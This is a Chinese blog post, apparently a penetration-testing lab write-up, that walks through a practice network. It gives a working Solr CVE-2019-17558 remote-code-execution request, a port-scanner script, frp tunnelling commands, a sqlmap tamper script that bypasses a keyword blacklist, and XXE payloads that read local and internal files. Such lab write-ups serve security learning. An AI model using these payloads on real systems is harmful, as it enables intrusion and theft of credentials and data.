
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>渗透靶场日记 03 | 『1nv_qaq&#39;s Blog』</title>
    <meta name="author" content="1nv-qaq" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
    />
    <link rel="icon" href="/images/avatar.jpg" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.cn" />
<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
<link
    rel="stylesheet"
    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
/>
<script> const mixins = {}; </script>

<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>


<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
<script src="/js/lib/math.js"></script>


<script src="/js/lib/preview.js"></script>









<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>wait wait wait...</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>『1NV_QAQ&#39;S BLOG』</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;『1NV_QAQ&#39;S BLOG』</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div class="article">
    <div>
        <h1>渗透靶场日记 03</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/11/29
        </span>
        
        <span class="category">
            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                渗透测试
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            
            <span class="tag">
                
                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #ff7d73">
                    渗透测试
                </a>
            </span>
            
        </span>
        
    </div>
    
    <div class="content" v-pre>
        <p>还是一套渗透靶场🎯</p>
<span id="more"></span>

<p>网络拓扑结构如下：</p>
<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2003/01.png" alt="img"></p>
<p>上手先打<code>solr</code>服务，默认端口为<code>8983</code>，<strong>CVE-2019-17558</strong>，<code>/solr/admin/cores</code>确定核心名为<code>Urahara</code></p>
<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2003/02.png" alt="img"></p>
<p>跟进<code>/solr/admin/cores</code>查看，发现<code>params.resource.loader.enabled</code>已经开启，如果没有开启，<code>POST</code>发个内容如下的包开启使用自定义模板</p>
<pre><code class="Plain">POST /solr/Urahara/config HTTP/1.1
Host: xx.xx.xx.xx:8983
Content-Type: application/json
Content-Length: 259

&#123;
  &quot;update-queryresponsewriter&quot;: &#123;
    &quot;startup&quot;: &quot;lazy&quot;,
    &quot;name&quot;: &quot;velocity&quot;,
    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,
    &quot;template.base.dir&quot;: &quot;&quot;,
    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,
    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;
  &#125;
&#125;
</code></pre>
<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2003/03.png" alt="img"></p>
<p>打<code>CVE-2019-17558</code>的poc</p>
<pre><code class="Bash">GET /solr/Urahara/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27pwd%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
</code></pre>
<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2003/04.png" alt="img"></p>
<p><code>cat%20/etc/passwd</code>拿到一组密码<code>root:123456</code></p>
<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2003/05.png" alt="img"></p>
<p><code>netstat%20-tuln</code>看开放端口情况，<code>10011</code>端口开放ssh</p>
<p><code>netstat</code>命令相关参数</p>
<p><code>-t</code>：仅显示TCP相关选项</p>
<p><code>-u</code>：仅显示UDP相关选项</p>
<p><code>-l</code>：仅显示监听套接字</p>
<p><code>-p</code>：显示进程标识符和程序名称</p>
<p><code>-n</code>：不进行DNS轮询，显示IP</p>
<p>例如<code>netstat -ntlp</code>可以查看当前所有TCP端口，<code>netstat -ntulp | grep 80</code>可以查看所有3306端口使用情况</p>
<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2003/06.png" alt="img"></p>
<p>ssh成功上线</p>
<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2003/07.png" alt="img"></p>
<p>找个scan.py开扫<code>python scan.py 172.55.2.0 172.55.2.254 -t 500</code></p>
<pre><code class="Python">!/usr/bin/env python
# -*- encoding: utf-8 -*-
import Queue
import threading
from threading import Thread
import time
import re
import sys
import os
import socket
import optparse
import urllib2
import socks

&#39;&#39;&#39;
一般默认常用端口扫描介绍：
3311:3312 kangle主机管理系统
3389 远程登录
4440 rundeck是用java写的开源工具
5672 rabbitMQ
5900 VNC
6082 varnish  参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网
6379 redis 一般无认证，可直接访问
7001 weblogic
8080 tomcat
8089 jboss
8161 activeMQ
8649 ganglia集群系统监控软件
9000 fastcgi服务
9090 IBM服务
9200,9300 elasticsearch  参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞
9999 amg加密版
10050 zabbix
11211  memcache  未授权访问
27017,28017 mongodb  未授权访问   mongodb默认无口令登录
3777 大华监控设备
50000 sap netweaver远程命令执行漏洞
50060 50070 hahoop、apache hasoop
21 默认是ftp端口  主要看是否支持匿名，也可以跑弱口令
22 默认是ssh端口
23 默认是telnet端口
25 默认是smtp服务
53 默认是DNS
123 是NTP
161,162，8161 snmp服务（8161 IBM一款产品所开放的SNMP）
389 ldap团体
443  openssl  、hearthleed
445 永恒之蓝
512,513 rlogin服务或者是exec
873 rsync 主要看是否支持匿名，也可以跑弱口令
1433 mssql数据库
1080 socks代理
1521 oracle
1900 bes默认后台
2049 nfs服务
2601,2604 zebra路由 默认密码zebra
2082,2083 cpanel主机管理系统
3128，3312 squid代理默认端口，如果没设置口令很可能就直接漫游内网了
3306 mysql数据库
4899 R-admin 连接端
4440 rundeck rundeck  参考WooYun: 借用新浪某服务成功漫游新浪内网
8834 nessus
4848 glashfish
&#39;&#39;&#39;


def ip2num(ip):
    ip = [int(x) for x in ip.split(&#39;.&#39;)]
    return ip[0] &lt;&lt; 24 | ip[1] &lt;&lt; 16 | ip[2] &lt;&lt; 8 | ip[3]
    
def num2ip(num):
    return &#39;%s.%s.%s.%s&#39; % ((num &amp; 0xff000000) &gt;&gt; 24,
                            (num &amp; 0x00ff0000) &gt;&gt; 16,
                            (num &amp; 0x0000ff00) &gt;&gt; 8,
                            num &amp; 0x000000ff)

def bThread():
    global queue
    global SETTHREAD
    print &#39;[Note] Running...\n&#39;
    sav_log(&#39;[Note] Running...\n&#39;)
    threadl = []
    threadl = [tThread(queue) for x in xrange(0, int(SETTHREAD))]
    for t in threadl:
        t.start()
    for t in threadl:
        t.join()

#输入到结束
def ip_range(start, end):
    return [num2ip(num) for num in range(ip2num(start), ip2num(end) + 1) if num &amp; 0xff]
# http请求获取返回内容
&#39;&#39;&#39;
return [0] 文件内容
return [1] 返回服务状态码
return [2] 返回服务器类型
return [3] location
return [4] title
&#39;&#39;&#39;
&#39;&#39;&#39;port scan&#39;&#39;&#39;
def scan_open_port_server():
    global lock
    while True:
        host,port=queue.get()
        ss=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ss.settimeout(2)
        try:
            ss.connect((host,port))
            lock.acquire()
            sav_log(&quot;%s 开放端口 %s   %s&quot; % (host, port,PORT[port]))
            lock.release()
            ss.close()
        except:
            pass
        queue.task_done()

def sav_log(content):
    filename = &quot;log.txt&quot;
    with open(filename,&quot;a&quot;) as file:
        file.write(content+&quot;\n&quot;)

def sock_reg():
    SOCKS_PROXY_HOST = &#39;127.0.0.1&#39;
    SOCKS_PROXY_PORT = 1234
    default_socket = socket.socket
    socks.set_default_proxy(socks.SOCKS5, SOCKS_PROXY_HOST,SOCKS_PROXY_PORT)
    socket.socket = socks.socksocket

if __name__ == &#39;__main__&#39;:
    usage=&quot;usage: mul_scan.py  192.168.1.1 192.168.1.254 -t 20&quot;
    parser = optparse.OptionParser(usage=usage)
    parser.add_option(&quot;-t&quot;, &quot;--threads&quot;, dest=&quot;NUM&quot;,help=&quot;Maximum threads, default 20&quot;)
    parser.add_option(&quot;-b&quot;, &quot;--start-ip&quot;, dest=&quot;startIp&quot;,help=&quot;start_ip&quot;)
    parser.add_option(&quot;-e&quot;, &quot;--end-ip&quot;, dest=&quot;endIp&quot;,help=&quot;end_ip&quot;)
    parser.add_option(&quot;-x&quot;, &quot;--proxy-socks5&quot;, dest=&quot;soc&quot;,help=&quot;-x socks5&quot;,type =&quot;string&quot;)
    (options, args) = parser.parse_args()
    if len(args) &lt; 1:
        parser.print_help()
        sys.exit()
    if options.NUM!=None and int(options.NUM)!=0:
        SETTHREAD=int(options.NUM)
        print &quot;SETTHREAD:&quot;+str(SETTHREAD)+&quot;\n&quot;
    else:
        SETTHREAD=20
    if options.soc!=None and options.soc==&quot;socks5&quot;:
        sock_reg() 
        print &quot;socks5&quot;   
    
    #日志格式化
    filename = &quot;log.txt&quot;
    if (os.path.exists(&quot;./&quot;+filename)):
        os.remove(&quot;./&quot;+filename) 

    
    #接受开始ip和结束ip         
    startIp =str(options.startIp)
    endIp = str(options.endIp)
    startIp=args[0]
    endIp=args[1]
    lock = threading.Lock()
    #程序运行时间
    PORT=&#123;445:&quot;Smb&quot;,80:&quot;Web&quot;,8080:&quot;Web&quot;,3311:&quot;kangle主机管理系统&quot;,3312:&quot;kangle主机管理系统&quot;,3389:&quot;远程登录&quot;,4440:&quot;rundeck是用java写的开源工具&quot;,5672:&quot;rabbitMQ&quot;,5900:&quot;vnc&quot;,6082:&quot;varnish&quot;,7001:&quot;weblogic&quot;,8161:&quot;activeMQ&quot;,8649:&quot;ganglia&quot;,9000:&quot;fastcgi&quot;,9090:&quot;ibm&quot;,9200:&quot;elasticsearch&quot;,9300:&quot;elasticsearch&quot;,9999:&quot;amg&quot;,10050:&quot;zabbix&quot;,11211:&quot;memcache&quot;,27017:&quot;mongodb&quot;,28017:&quot;mondodb&quot;,3777:&quot;大华监控设备&quot;,50000:&quot;sap netweaver&quot;,50060:&quot;hadoop&quot;,50070:&quot;hadoop&quot;,21:&quot;ftp&quot;,22:&quot;ssh&quot;,23:&quot;telnet&quot;,25:&quot;smtp&quot;,53:&quot;dns&quot;,123:&quot;ntp&quot;,161:&quot;snmp&quot;,8161:&quot;snmp&quot;,162:&quot;snmp&quot;,389:&quot;ldap&quot;,443:&quot;ssl&quot;,512:&quot;rlogin&quot;,513:&quot;rlogin&quot;,873:&quot;rsync&quot;,1433:&quot;mssql&quot;,1080:&quot;socks&quot;,1521:&quot;oracle&quot;,1900:&quot;bes&quot;,2049:&quot;nfs&quot;,2601:&quot;zebra&quot;,2604:&quot;zebra&quot;,2082:&quot;cpanle&quot;,2083:&quot;cpanle&quot;,3128:&quot;squid&quot;,3312:&quot;squid&quot;,3306:&quot;mysql&quot;,4899:&quot;radmin&quot;,8834:&#39;nessus&#39;,4848:&#39;glashfish&#39;&#125;
    starttime=time.time()
    queue = Queue.Queue()
    iplist = ip_range(startIp, endIp)
    sav_log(&#39;端口采用默认扫描请自行进行比对:\nbegin Scan &#39;+str(len(iplist))+&quot; ip...&quot;)
    for i in xrange(SETTHREAD):
        st1 = threading.Thread(target=scan_open_port_server)
        st1.setDaemon(True)
        st1.start()
    for host in iplist:
        for port in PORT.keys():
            queue.put((host,port))
    queue.join()
    sav_log(&#39;All RUN TIME：&#39;+str(time.time()-starttime))
</code></pre>
<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2003/08.png" alt="img"></p>
<p>接着<code>frpc</code>搭建内网隧道，配置<code>frpc.ini</code></p>
<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2003/09.png" alt="img"></p>
<pre><code>frps.exe -c frps.ini
chmod +x frpc
./frpc -c frpc.ini
</code></pre>
<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2003/10.png" alt="img"></p>
<p>配置<code>SOCKS5</code>全局代理<code>127.0.0.1:9998</code>测试过后，<code>172.55.2.100/login.php</code>可能存在注入，尝试<code>admin&#39; and 1=1#</code>发现存在黑名单，但可以双写绕过</p>
<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2003/11.png" alt="img"></p>
<p>手动fuzz得到大概的blacklist如下：</p>
<pre><code class="Plain">and
or
select
substr
ascii
</code></pre>
<p>于是重写一份<code>sqlmap</code>的<code>tamper</code>脚本</p>
<pre><code class="Python">#!/usr/bin/env python
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    payload = payload.replace(&quot;OR&quot;, &quot;OORR&quot;)
    payload = payload.replace(&quot;or&quot;, &quot;oorr&quot;)
    payload = payload.replace(&quot;AND&quot;, &quot;AANDND&quot;)
    payload = payload.replace(&quot;SELECT&quot;, &quot;SELSELECTECT&quot;)
    payload = payload.replace(&quot;ASCII&quot;, &quot;ASCASCIIII&quot;)
    payload = payload.replace(&quot;SUBSTR&quot;, &quot;SUBSUBSTRSTR&quot;)
    return payload
</code></pre>
<p>无回显提示密码错误等，可能存在盲注</p>
<p>登录界面抓包保存到<code>pcap.txt</code></p>
<pre><code>python3 sqlmap.py -r C:\...\pcap.txt --tamper=mytamper -p username --dbs
</code></pre>
<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2003/12.png" alt="img"></p>
<p>拿到了两个数据库，dump数据库<code>heavysql</code></p>
<pre><code>python3 sqlmap.py -r C:\...\pcap.txt --tamper=mytamper -p username -D heavysql --dump
</code></pre>
<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2003/13.png" alt="img"></p>
<p><code>admin:a8ujj2fa2ddasd</code></p>
<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2003/14.png" alt="img"></p>
<p>成功登录以后，<code>content</code>这里看着像<code>XXE</code>，读<code>/etc/hosts</code></p>
<pre><code class="XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY foo SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/hosts&quot;&gt;
]&gt;&lt;root&gt;&amp;foo;&lt;/root&gt;
</code></pre>
<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2003/15.png" alt="img"></p>
<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2003/16.png" alt="img"></p>
<p>进一步访问<code>.10</code>的IP</p>
<pre><code class="XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY foo SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://172.55.2.10&quot;&gt;
]&gt;&lt;root&gt;&amp;foo;&lt;/root&gt;
</code></pre>
<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2003/17.png" alt="img"></p>
<p>是个<code>file browser</code>，尝试一下最后<code>GET</code>传参数<code>file</code>在根目录下读到<code>flag</code></p>
<pre><code class="XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY foo SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://172.55.2.10?file=/flag&quot;&gt;
]&gt;&lt;root&gt;&amp;foo;&lt;/root&gt;
</code></pre>
<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2003/18.png" alt="img"></p>

    </div>
    
    
    
    
    
    
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2024 - 2025 『1nv_qaq&#39;s Blog』
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;1nv-qaq
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    <script src="/js/<fireworks.min.js>"></script>


    <canvas
    id="fireworks"
    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"
></canvas>
<script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
<script src="/js/fireworks.min.js"></script>




    
    




    
</body>
</html>
